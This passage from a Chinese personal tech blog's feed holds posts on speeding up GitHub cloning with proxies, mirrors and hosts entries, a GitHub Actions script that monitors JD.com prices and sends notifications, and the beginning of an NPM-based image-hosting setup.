class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span 